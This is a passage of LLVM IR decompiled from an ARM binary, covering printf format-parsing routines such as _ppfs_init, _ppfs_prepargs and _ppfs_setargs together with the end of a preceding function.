  %stack_var_-316.3 = phi i32 [ %v0_b630, %dec_label_pc_b5dc ], [ %v0_b954, %dec_label_pc_ba30 ], [ %v0_b630, %dec_label_pc_b7b8 ]
  %stack_var_-336.3 = phi i32 [ %stack_var_-336.2, %dec_label_pc_b5dc ], [ %v2_b940, %dec_label_pc_ba30 ], [ %v2_b7bc, %dec_label_pc_b7b8 ]
  %v3_ba48 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_ba48, i32* @r4, align 4
  br label %dec_label_pc_ba4c

dec_label_pc_ba4c:                                ; preds = %dec_label_pc_b4ec, %dec_label_pc_ba48
  %v0_ba4c = phi i32 [ %v0_ba4c.pre, %dec_label_pc_b4ec ], [ %v3_ba48, %dec_label_pc_ba48 ]
  %v0_b630 = phi i32 [ %tmp100, %dec_label_pc_b4ec ], [ %stack_var_-316.3, %dec_label_pc_ba48 ]
  %stack_var_-336.4 = phi i32 [ 0, %dec_label_pc_b4ec ], [ %stack_var_-336.3, %dec_label_pc_ba48 ]
  store i32 %v0_ba4c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_b504.outer

dec_label_pc_b504.outer:                          ; preds = %dec_label_pc_ba54, %dec_label_pc_ba4c
  %v5_b530 = phi i32 [ %v1_b560, %dec_label_pc_ba54 ], [ %v0_ba4c, %dec_label_pc_ba4c ]
  %v0_b50449 = phi i32 [ %v1_ba54, %dec_label_pc_ba54 ], [ %v0_ba4c, %dec_label_pc_ba4c ]
  %stack_var_-336.1.ph = phi i32 [ %stack_var_-336.2, %dec_label_pc_ba54 ], [ %stack_var_-336.4, %dec_label_pc_ba4c ]
  %v1_b504180 = inttoptr i32 %v0_b50449 to i8*
  %v2_b504181 = load i8, i8* %v1_b504180, align 1
  %v3_b504182 = zext i8 %v2_b504181 to i32
  store i32 %v3_b504182, i32* %r3.global-to-local, align 4
  %v2_b508183 = icmp eq i8 %v2_b504181, 0
  br i1 %v2_b508183, label %dec_label_pc_b520, label %bb126

dec_label_pc_ba54:                                ; preds = %dec_label_pc_b560
  %v1_ba54 = add i32 %v0_b568, 2
  store i32 %v1_ba54, i32* @r4, align 4
  br label %dec_label_pc_b504.outer

dec_label_pc_ba5c:                                ; preds = %dec_label_pc_b8cc, %dec_label_pc_ba30, %.thread36, %dec_label_pc_b97c, %dec_label_pc_b960, %dec_label_pc_b830, %bb162, %dec_label_pc_b794, %bb130, %dec_label_pc_ba0c
  store i32 -1, i32* @lr, align 4
  br label %dec_label_pc_ba64

dec_label_pc_ba64:                                ; preds = %dec_label_pc_b554, %bb, %dec_label_pc_b4d4, %dec_label_pc_ba5c
  %stack_var_-336.5 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_b4d4 ], [ -1, %dec_label_pc_ba5c ], [ %stack_var_-336.2, %dec_label_pc_b554 ]
  store i32 %stack_var_-336.5, i32* %r0.global-to-local, align 4
  store i32 %v6_b490, i32* @r5, align 4
  store i32 %v15_b490, i32* %r8.global-to-local, align 4
  store i32 %v18_b490, i32* @sb, align 4
  store i32 %v21_b490, i32* @sl, align 4
  store i32 %v24_b490, i32* @fp, align 4
  ret i32 %stack_var_-336.5

; uselistorder directives
  uselistorder i32 %stack_var_-336.5, { 1, 0 }
  uselistorder i32 %v1_ba54, { 1, 0 }
  uselistorder i8 %v2_b504181, { 1, 2, 0 }
  uselistorder i32 %v0_b50449, { 2, 0, 1 }
  uselistorder i32 %v5_b530, { 2, 3, 1, 0 }
  uselistorder i32 %v0_b630, { 9, 12, 13, 2, 10, 8, 11, 6, 5, 4, 1, 0, 7, 3, 15, 14 }
  uselistorder i32 %v0_ba4c, { 1, 0, 2 }
  uselistorder i32 %v1_b9e0, { 2, 1, 0 }
  uselistorder i32 %v0_b9e8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_b968, { 1, 0 }
  uselistorder i32 %v2_b94c, { 2, 0, 1 }
  uselistorder i1 %v3_b92c, { 1, 0 }
  uselistorder i32 %v0_b93c, { 0, 2, 3, 1 }
  uselistorder i32 %v2_b910, { 1, 0 }
  uselistorder i32 %v0_b954, { 1, 0, 2 }
  uselistorder i32 %v3_b8e4, { 1, 2, 0 }
  uselistorder i32 %v0_b894, { 1, 0 }
  uselistorder i32 %v2_b878, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_b840, { 1, 2, 0, 3 }
  uselistorder i32 %v0_b80c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_b710, { 3, 2, 0, 4, 1, 5 }
  uselistorder i32 %v0_b72c, { 1, 2, 3, 0 }
  uselistorder i32 %v6_b6ac, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_b610, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_b5c0.pre, { 2, 1, 0 }
  uselistorder i32 %v1_b5b8, { 1, 0 }
  uselistorder i32 %v1_b560, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-336.2, { 0, 8, 6, 1, 2, 5, 4, 3, 7 }
  uselistorder i32 %v2_b520, { 1, 0 }
  uselistorder i32 %v1_b518.lcssa, { 1, 0 }
  uselistorder i8 %v2_b504, { 1, 2, 0 }
  uselistorder i32 %v2_b518, { 1, 2, 3, 0 }
  uselistorder i1 %v7_b724, { 1, 0 }
  uselistorder i1 %v7_b670, { 1, 2, 0 }
  uselistorder i1 %v7_b868, { 1, 0 }
  uselistorder i1 %v7_b7c8, { 1, 0 }
  uselistorder i1 %v7_b6b4, { 1, 0 }
  uselistorder i32 %v2_b808, { 0, 2, 1, 3 }
  uselistorder i32 %v2_b8d8, { 3, 2, 5, 4, 11, 10, 9, 7, 8, 6, 1, 0 }
  uselistorder i32* %v1_b5e8, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_b5bc, { 2, 4, 3, 5, 0, 1 }
  uselistorder i32 %v2_b59c, { 1, 2, 0 }
  uselistorder i32 %v4_b594, { 1, 0 }
  uselistorder i32 %v2_b498, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-332, { 2, 1, 3, 4, 0, 5 }
  uselistorder i32 %tmp103, { 2, 1, 0 }
  uselistorder i32 %tmp102, { 19, 18, 15, 13, 8, 9, 0, 10, 12, 11, 3, 4, 5, 6, 7, 1, 2, 17, 16, 14 }
  uselistorder i32 %tmp101, { 6, 5, 3, 2, 0, 4, 1 }
  uselistorder i32 %tmp97, { 2, 1, 3, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 5, 6, 3, 4, 7, 8, 2, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 1, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r2.global-to-local, { 24, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 2, 22, 23, 25, 26, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 6, 5, 8, 7, 10, 9, 11, 12, 14, 13, 16, 15, 17, 18, 21, 19, 20, 23, 22, 25, 24, 27, 26, 29, 28, 33, 30, 31, 32, 1, 34, 35, 36, 37, 3, 2, 39, 38, 41, 40, 43, 42, 45, 44, 0 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 55, { 1, 0 }
  uselistorder label %dec_label_pc_ba64, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_ba5c, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_ba4c, { 1, 0 }
  uselistorder label %dec_label_pc_ba0c, { 1, 0 }
  uselistorder label %.thread36, { 1, 0 }
  uselistorder label %dec_label_pc_b97c, { 1, 0 }
  uselistorder label %.thread29, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %dec_label_pc_b928, { 1, 0 }
  uselistorder label %dec_label_pc_b90c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_b90cthread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_b900, { 1, 0 }
  uselistorder label %dec_label_pc_b8f0, { 0, 2, 1 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %dec_label_pc_b884, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb159, { 1, 0 }
  uselistorder label %bb157, { 4, 1, 2, 0, 3 }
  uselistorder label %bb154, { 1, 0 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 4, 3, 1, 0, 2 }
  uselistorder label %bb145, { 1, 0 }
  uselistorder label %dec_label_pc_b660, { 1, 0 }
  uselistorder label %dec_label_pc_b65c, { 2, 1, 0 }
  uselistorder label %bb139, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b5b4, { 1, 0 }
  uselistorder label %bb134, { 1, 0 }
  uselistorder label %dec_label_pc_b554, { 1, 0 }
  uselistorder label %bb130, { 1, 0 }
  uselistorder label %dec_label_pc_b520, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_ba84 = load i32, i32* @r4, align 4
  store i32 %v3_ba84, i32* %stack_var_-12, align 4
  %v6_ba84 = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_ba90 = load i32, i32* @r1, align 4
  store i32 %v0_ba90, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_ba98 = bitcast i32* %arg1 to i8*
  %v3_ba98 = call i32 @__GI_memset(i8* %v2_ba98, i32 0)
  %v0_ba9c = load i32, i32* @r4, align 4
  %v1_ba9c = add i32 %v0_ba9c, 24
  %v2_ba9c = inttoptr i32 %v1_ba9c to i32*
  %v3_ba9c = load i32, i32* %v2_ba9c, align 4
  %v1_baa0 = add i32 %v3_ba9c, -1
  store i32 %v1_baa0, i32* %v2_ba9c, align 4
  %v0_baa8 = load i32, i32* @r5, align 4
  %v1_baa8 = load i32, i32* @r4, align 4
  %v2_baa8 = inttoptr i32 %v1_baa8 to i32*
  store i32 %v0_baa8, i32* %v2_baa8, align 4
  %v0_baac = load i32, i32* @r4, align 4
  %v1_baac = add i32 %v0_baac, 40
  store i32 %v1_baac, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v2_babc19 = inttoptr i32 %v1_baac to i32*
  store i32 8, i32* %v2_babc19, align 4
  %v3_babc20 = load i32, i32* %r1.global-to-local, align 4
  %v4_babc21 = add i32 %v3_babc20, 4
  store i32 %v4_babc21, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_bab4.dec_label_pc_bab4_crit_edge

dec_label_pc_bab4.dec_label_pc_bab4_crit_edge:    ; preds = %entry, %dec_label_pc_bab4.dec_label_pc_bab4_crit_edge
  %v4_babc22 = phi i32 [ %v4_babc21, %entry ], [ %v4_babc, %dec_label_pc_bab4.dec_label_pc_bab4_crit_edge ]
  %v0_bab8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_bab8 = add i32 %v0_bab8.pre, -1
  store i32 %v1_bab8, i32* %r2.global-to-local, align 4
  %v7_bab8 = icmp eq i32 %v0_bab8.pre, 1
  %v2_babc = inttoptr i32 %v4_babc22 to i32*
  store i32 8, i32* %v2_babc, align 4
  %v3_babc = load i32, i32* %r1.global-to-local, align 4
  %v4_babc = add i32 %v3_babc, 4
  store i32 %v4_babc, i32* %r1.global-to-local, align 4
  br i1 %v7_bab8, label %dec_label_pc_bac4, label %dec_label_pc_bab4.dec_label_pc_bab4_crit_edge

dec_label_pc_bac4:                                ; preds = %dec_label_pc_bab4.dec_label_pc_bab4_crit_edge
  %v0_bac4 = load i32, i32* @r5, align 4
  store i32 %v0_bac4, i32* %r2.global-to-local, align 4
  %v1_bb083 = inttoptr i32 %v0_bac4 to i8*
  %v2_bb084 = load i8, i8* %v1_bb083, align 1
  %v2_bb0c6 = icmp eq i8 %v2_bb084, 0
  br i1 %v2_bb0c6, label %dec_label_pc_bb14, label %dec_label_pc_bad4

dec_label_pc_bacc:                                ; preds = %dec_label_pc_baec
  %v2_bad0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_bad0, i32* @r4, align 4
  store i32 %v6_ba84, i32* @r5, align 4
  ret i32 -1

dec_label_pc_bad4:                                ; preds = %dec_label_pc_bac4, %dec_label_pc_bb08.backedge
  %v0_badc = phi i32 [ %storemerge, %dec_label_pc_bb08.backedge ], [ %v0_bac4, %dec_label_pc_bac4 ]
  %v2_bb087 = phi i8 [ %v2_bb08, %dec_label_pc_bb08.backedge ], [ %v2_bb084, %dec_label_pc_bac4 ]
  %v7_bad4 = icmp eq i8 %v2_bb087, 37
  br i1 %v7_bad4, label %dec_label_pc_badc, label %dec_label_pc_bb04

dec_label_pc_badc:                                ; preds = %dec_label_pc_bad4
  %v1_badc = add i32 %v0_badc, 1
  %v2_badc = inttoptr i32 %v1_badc to i8*
  %v3_badc = load i8, i8* %v2_badc, align 1
  store i32 %v1_badc, i32* %r2.global-to-local, align 4
  %v7_bae0 = icmp eq i8 %v3_badc, 37
  br i1 %v7_bae0, label %dec_label_pc_bb04, label %dec_label_pc_baec

dec_label_pc_baec:                                ; preds = %dec_label_pc_badc
  %v0_bae4 = load i32, i32* @r4, align 4
  %v2_baec = inttoptr i32 %v0_bae4 to i32*
  store i32 %v1_badc, i32* %v2_baec, align 4
  %v2_baf0 = call i32 @_ppfs_parsespec(i32* %v2_baec)
  %v1_baf4 = icmp slt i32 %v2_baf0, 0
  br i1 %v1_baf4, label %dec_label_pc_bacc, label %dec_label_pc_bafc

dec_label_pc_bafc:                                ; preds = %dec_label_pc_baec
  %v0_bafc = load i32, i32* @r4, align 4
  %v1_bafc = inttoptr i32 %v0_bafc to i32*
  %v2_bafc = load i32, i32* %v1_bafc, align 4
  br label %dec_label_pc_bb08.backedge

dec_label_pc_bb04:                                ; preds = %dec_label_pc_bad4, %dec_label_pc_badc
  %v0_bb04 = phi i32 [ %v0_badc, %dec_label_pc_bad4 ], [ %v1_badc, %dec_label_pc_badc ]
  %v1_bb04 = add i32 %v0_bb04, 1
  br label %dec_label_pc_bb08.backedge

dec_label_pc_bb08.backedge:                       ; preds = %dec_label_pc_bb04, %dec_label_pc_bafc
  %storemerge = phi i32 [ %v1_bb04, %dec_label_pc_bb04 ], [ %v2_bafc, %dec_label_pc_bafc ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_bb08 = inttoptr i32 %storemerge to i8*
  %v2_bb08 = load i8, i8* %v1_bb08, align 1
  %v2_bb0c = icmp eq i8 %v2_bb08, 0
  br i1 %v2_bb0c, label %dec_label_pc_bb08.dec_label_pc_bb14_crit_edge, label %dec_label_pc_bad4

dec_label_pc_bb08.dec_label_pc_bb14_crit_edge:    ; preds = %dec_label_pc_bb08.backedge
  %v0_bb14.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_bb14

dec_label_pc_bb14:                                ; preds = %dec_label_pc_bb08.dec_label_pc_bb14_crit_edge, %dec_label_pc_bac4
  %v0_bb14 = phi i32 [ %v0_bb14.pre, %dec_label_pc_bb08.dec_label_pc_bb14_crit_edge ], [ %v0_bac4, %dec_label_pc_bac4 ]
  %v3_bb08.lcssa.in = phi i8 [ %v2_bb08, %dec_label_pc_bb08.dec_label_pc_bb14_crit_edge ], [ %v2_bb084, %dec_label_pc_bac4 ]
  %v3_bb08.lcssa = zext i8 %v3_bb08.lcssa.in to i32
  %v1_bb14 = load i32, i32* @r4, align 4
  %v2_bb14 = inttoptr i32 %v1_bb14 to i32*
  store i32 %v0_bb14, i32* %v2_bb14, align 4
  %v2_bb18 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_bb18, i32* @r4, align 4
  store i32 %v6_ba84, i32* @r5, align 4
  ret i32 %v3_bb08.lcssa

; uselistorder directives
  uselistorder i8 %v2_bb08, { 0, 2, 1 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_bac4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_babc, { 1, 0 }
  uselistorder i32 %v0_bab8.pre, { 1, 0 }
  uselistorder i32 %v6_ba84, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 5, 4, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 4, 5, 1, 2, 3 }
  uselistorder label %dec_label_pc_bb04, { 1, 0 }
  uselistorder label %dec_label_pc_bad4, { 1, 0 }
  uselistorder label %dec_label_pc_bab4.dec_label_pc_bab4_crit_edge, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_bb1c = load i32, i32* @r4, align 4
  store i32 %v3_bb1c, i32* %stack_var_-12, align 4
  %v1_bb20 = add i32 %arg1, 24
  %v2_bb20 = inttoptr i32 %v1_bb20 to i32*
  %v3_bb20 = load i32, i32* %v2_bb20, align 4
  store i32 %v3_bb20, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_bb30 = add i32 %arg1, 76
  %v3_bb30 = inttoptr i32 %v2_bb30 to i32*
  store i32 %arg2, i32* %v3_bb30, align 4
  %v7_bb34 = icmp sgt i32 %v3_bb20, 0
  br i1 %v7_bb34, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v10_bb34 = load i32, i32* %stack_var_-12, align 4
  store i32 %v10_bb34, i32* @r4, align 4
  ret i32 %arg1

bb4:                                              ; preds = %entry
  %v0_bb38 = load i32, i32* %r3.global-to-local, align 4
  %v2_bb38 = add i32 %arg1, 8
  %v3_bb38 = inttoptr i32 %v2_bb38 to i32*
  store i32 %v0_bb38, i32* %v3_bb38, align 4
  %v0_bb3c = load i32, i32* %r5.global-to-local, align 4
  %v2_bb3c = add i32 %arg1, 28
  %v3_bb3c = inttoptr i32 %v2_bb3c to i32*
  store i32 %v0_bb3c, i32* %v3_bb3c, align 4
  %v0_bb40 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_bb40, i32* %v2_bb20, align 4
  %v0_bb44 = load i32, i32* %r3.global-to-local, align 4
  %v2_bb44 = add i32 %arg1, 4
  %v3_bb44 = inttoptr i32 %v2_bb44 to i32*
  store i32 %v0_bb44, i32* %v3_bb44, align 4
  %v0_bb48 = call i32 @_ppfs_setargs()
  %v0_bb4c = load i32, i32* %r5.global-to-local, align 4
  %v1_bb4c = load i32, i32* @r4, align 4
  %v2_bb4c = add i32 %v1_bb4c, 24
  %v3_bb4c = inttoptr i32 %v2_bb4c to i32*
  store i32 %v0_bb4c, i32* %v3_bb4c, align 4
  %v2_bb50 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_bb50, i32* @r4, align 4
  ret i32 %v0_bb48

; uselistorder directives
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 6, 4, 5, 2, 1, 3, 7 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_bb54 = load i32, i32* @r0, align 4
  %v1_bb54 = add i32 %v0_bb54, 24
  %v2_bb54 = inttoptr i32 %v1_bb54 to i32*
  %v3_bb54 = load i32, i32* %v2_bb54, align 4
  store i32 %v3_bb54, i32* %r1.global-to-local, align 4
  %v2_bb58 = icmp eq i32 %v3_bb54, 0
  %v3_bb5c = load i32, i32* @r4, align 4
  store i32 %v3_bb5c, i32* %stack_var_-8, align 4
  %v1_bb60 = add i32 %v0_bb54, 80
  store i32 %v1_bb60, i32* %ip.global-to-local, align 4
  %v1_bb64 = add i32 %v0_bb54, 8
  %v2_bb64 = inttoptr i32 %v1_bb64 to i32*
  %v3_bb64 = load i32, i32* %v2_bb64, align 4
  store i32 %v3_bb64, i32* %r3.global-to-local, align 4
  %v6_bb6c = icmp eq i32 %v3_bb64, -2147483648
  br i1 %v2_bb58, label %dec_label_pc_bb6c, label %dec_label_pc_bc90

dec_label_pc_bb6c:                                ; preds = %entry
  br i1 %v6_bb6c, label %dec_label_pc_bb74, label %dec_label_pc_bb8c

dec_label_pc_bb74:                                ; preds = %dec_label_pc_bb6c
  %v1_bb74 = add i32 %v0_bb54, 76
  %v2_bb74 = inttoptr i32 %v1_bb74 to i32*
  %v3_bb74 = load i32, i32* %v2_bb74, align 4
  store i32 %v3_bb74, i32* %r3.global-to-local, align 4
  %v1_bb78 = inttoptr i32 %v3_bb74 to i32*
  %v2_bb78 = load i32, i32* %v1_bb78, align 4
  store i32 %v2_bb78, i32* %r2.global-to-local, align 4
  %v1_bb7c = add i32 %v3_bb74, 4
  store i32 %v1_bb7c, i32* %r3.global-to-local, align 4
  store i32 %v1_bb7c, i32* %v2_bb74, align 4
  %v0_bb84 = load i32, i32* %r2.global-to-local, align 4
  %v1_bb84 = load i32, i32* @r0, align 4
  %v2_bb84 = add i32 %v1_bb84, 8
  %v3_bb84 = inttoptr i32 %v2_bb84 to i32*
  store i32 %v0_bb84, i32* %v3_bb84, align 4
  %v0_bb88 = load i32, i32* %r2.global-to-local, align 4
  %v1_bb88 = load i32, i32* @r0, align 4
  %v2_bb88 = add i32 %v1_bb88, 80
  %v3_bb88 = inttoptr i32 %v2_bb88 to i32*
  store i32 %v0_bb88, i32* %v3_bb88, align 4
  %v0_bb8c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_bb8c

dec_label_pc_bb8c:                                ; preds = %dec_label_pc_bb6c, %dec_label_pc_bb74
  %v1_bba4 = phi i32 [ %v0_bb54, %dec_label_pc_bb6c ], [ %v0_bb8c.pre, %dec_label_pc_bb74 ]
  %v1_bb8c = add i32 %v1_bba4, 4
  %v2_bb8c = inttoptr i32 %v1_bb8c to i32*
  %v3_bb8c = load i32, i32* %v2_bb8c, align 4
  store i32 %v3_bb8c, i32* %r3.global-to-local, align 4
  %v6_bb90 = icmp eq i32 %v3_bb8c, -2147483648
  br i1 %v6_bb90, label %dec_label_pc_bb98, label %dec_label_pc_bbb0

dec_label_pc_bb98:                                ; preds = %dec_label_pc_bb8c
  %v1_bb98 = add i32 %v1_bba4, 76
  %v2_bb98 = inttoptr i32 %v1_bb98 to i32*
  %v3_bb98 = load i32, i32* %v2_bb98, align 4
  store i32 %v3_bb98, i32* %r3.global-to-local, align 4
  %v1_bb9c = inttoptr i32 %v3_bb98 to i32*
  %v2_bb9c = load i32, i32* %v1_bb9c, align 4
  store i32 %v2_bb9c, i32* %r2.global-to-local, align 4
  %v1_bba0 = add i32 %v3_bb98, 4
  store i32 %v1_bba0, i32* %r3.global-to-local, align 4
  store i32 %v1_bba0, i32* %v2_bb98, align 4
  %v0_bba8 = load i32, i32* %r2.global-to-local, align 4
  %v1_bba8 = load i32, i32* @r0, align 4
  %v2_bba8 = add i32 %v1_bba8, 4
  %v3_bba8 = inttoptr i32 %v2_bba8 to i32*
  store i32 %v0_bba8, i32* %v3_bba8, align 4
  %v0_bbac = load i32, i32* %r2.global-to-local, align 4
  %v1_bbac = load i32, i32* @r0, align 4
  %v2_bbac = add i32 %v1_bbac, 80
  %v3_bbac = inttoptr i32 %v2_bbac to i32*
  store i32 %v0_bbac, i32* %v3_bbac, align 4
  %v0_bc8018.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_bbb0

dec_label_pc_bbb0:                                ; preds = %dec_label_pc_bb8c, %dec_label_pc_bb98
  %v0_bc8018 = phi i32 [ %v1_bba4, %dec_label_pc_bb8c ], [ %v0_bc8018.pre, %dec_label_pc_bb98 ]
  %v0_bbb0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_bbb0, i32* @lr, align 4
  %v1_bc8019 = add i32 %v0_bc8018, 28
  %v2_bc8020 = inttoptr i32 %v1_bc8019 to i32*
  %v3_bc8021 = load i32, i32* %v2_bc8020, align 4
  store i32 %v3_bc8021, i32* %r3.global-to-local, align 4
  %v5_bc8823 = icmp slt i32 %v0_bbb0, %v3_bc8021
  br i1 %v5_bc8823, label %dec_label_pc_bbb8, label %dec_label_pc_bc8c.loopexit

dec_label_pc_bbb8:                                ; preds = %dec_label_pc_bbb0, %dec_label_pc_bc7c
  %v0_bc8025 = phi i32 [ %v0_bc80, %dec_label_pc_bc7c ], [ %v0_bc8018, %dec_label_pc_bbb0 ]
  %v1_bbb824 = phi i32 [ %v1_bc7c, %dec_label_pc_bc7c ], [ %v0_bbb0, %dec_label_pc_bbb0 ]
  %v4_bbb8 = mul i32 %v1_bbb824, 4
  %v5_bbb8 = add i32 %v0_bc8025, %v4_bbb8
  store i32 %v5_bbb8, i32* %r3.global-to-local, align 4
  %v1_bbbc = add i32 %v5_bbb8, 40
  %v2_bbbc = inttoptr i32 %v1_bbbc to i32*
  %v3_bbbc = load i32, i32* %v2_bbbc, align 4
  store i32 %v3_bbbc, i32* %r2.global-to-local, align 4
  %v7_bbc0 = icmp eq i32 %v3_bbbc, 8
  br i1 %v7_bbc0, label %dec_label_pc_bc7c, label %dec_label_pc_bbc8

dec_label_pc_bbc8:                                ; preds = %dec_label_pc_bbb8
  %v1_bbc8 = add i32 %v0_bc8025, 76
  %v2_bbc8 = inttoptr i32 %v1_bbc8 to i32*
  %v3_bbc8 = load i32, i32* %v2_bbc8, align 4
  store i32 %v3_bbc8, i32* %r1.global-to-local, align 4
  %v8_bbcc = icmp sgt i32 %v3_bbbc, 8
  br i1 %v8_bbcc, label %dec_label_pc_bbf0, label %dec_label_pc_bbd0

dec_label_pc_bbd0:                                ; preds = %dec_label_pc_bbc8
  %v7_bbd0 = icmp eq i32 %v3_bbbc, 2
  br i1 %v7_bbd0, label %dec_label_pc_bc3c, label %dec_label_pc_bbd8

dec_label_pc_bbd8:                                ; preds = %dec_label_pc_bbd0
  %v8_bbd8 = icmp sgt i32 %v3_bbbc, 2
  br i1 %v8_bbd8, label %dec_label_pc_bbe8, label %dec_label_pc_bbdc

dec_label_pc_bbdc:                                ; preds = %dec_label_pc_bbd8
  %v1_bbdc = icmp slt i32 %v3_bbbc, 0
  br i1 %v1_bbdc, label %dec_label_pc_bc68, label %dec_label_pc_bc3c

dec_label_pc_bbe8:                                ; preds = %dec_label_pc_bbd8
  %v7_bbe8 = icmp eq i32 %v3_bbbc, 7
  br i1 %v7_bbe8, label %dec_label_pc_bc50, label %dec_label_pc_bc68

dec_label_pc_bbf0:                                ; preds = %dec_label_pc_bbc8
  %v7_bbf0 = icmp eq i32 %v3_bbbc, 1024
  br i1 %v7_bbf0, label %dec_label_pc_bc3c, label %dec_label_pc_bbf8

dec_label_pc_bbf8:                                ; preds = %dec_label_pc_bbf0
  %v8_bbf8 = icmp sgt i32 %v3_bbbc, 1024
  br i1 %v8_bbf8, label %dec_label_pc_bc10, label %dec_label_pc_bbfc

dec_label_pc_bbfc:                                ; preds = %dec_label_pc_bbf8
  switch i32 %v3_bbbc, label %dec_label_pc_bc68 [
    i32 256, label %dec_label_pc_bc3c
    i32 512, label %dec_label_pc_bc3c
  ]

dec_label_pc_bc10:                                ; preds = %dec_label_pc_bbf8
  %v7_bc10 = icmp eq i32 %v3_bbbc, 2048
  br i1 %v7_bc10, label %dec_label_pc_bc28, label %dec_label_pc_bc20

dec_label_pc_bc20:                                ; preds = %dec_label_pc_bc10
  store i32 2055, i32* %r3.global-to-local, align 4
  %v9_bc1c = icmp eq i32 %v3_bbbc, 2055
  br i1 %v9_bc1c, label %dec_label_pc_bc50, label %dec_label_pc_bc68

dec_label_pc_bc28:                                ; preds = %dec_label_pc_bc10
  %v1_bc28 = add i32 %v3_bbc8, 8
  store i32 %v1_bc28, i32* %r3.global-to-local, align 4
  store i32 %v1_bc28, i32* %v2_bbc8, align 4
  %v0_bc30 = load i32, i32* %r1.global-to-local, align 4
  %v1_bc30 = inttoptr i32 %v0_bc30 to i32*
  %v2_bc30 = load i32, i32* %v1_bc30, align 4
  store i32 %v2_bc30, i32* %r3.global-to-local, align 4
  %v3_bc30 = add i32 %v0_bc30, 4
  %v4_bc30 = inttoptr i32 %v3_bc30 to i32*
  %v5_bc30 = load i32, i32* %v4_bc30, align 4
  store i32 %v5_bc30, i32* %r4.global-to-local, align 4
  %v0_bc34 = load i32, i32* %ip.global-to-local, align 4
  %v1_bc34 = inttoptr i32 %v0_bc34 to i32*
  store i32 %v2_bc30, i32* %v1_bc34, align 4
  %v3_bc34 = add i32 %v0_bc34, 4
  %v4_bc34 = inttoptr i32 %v3_bc34 to i32*
  %v5_bc34 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_bc34, i32* %v4_bc34, align 4
  br label %dec_label_pc_bc78

dec_label_pc_bc3c:                                ; preds = %dec_label_pc_bbfc, %dec_label_pc_bbfc, %dec_label_pc_bbdc, %dec_label_pc_bbf0, %dec_label_pc_bbd0
  %v1_bc3c = inttoptr i32 %v3_bbc8 to i32*
  %v2_bc3c = load i32, i32* %v1_bc3c, align 4
  store i32 %v2_bc3c, i32* %r2.global-to-local, align 4
  %v1_bc40 = add i32 %v3_bbc8, 4
  store i32 %v1_bc40, i32* %r3.global-to-local, align 4
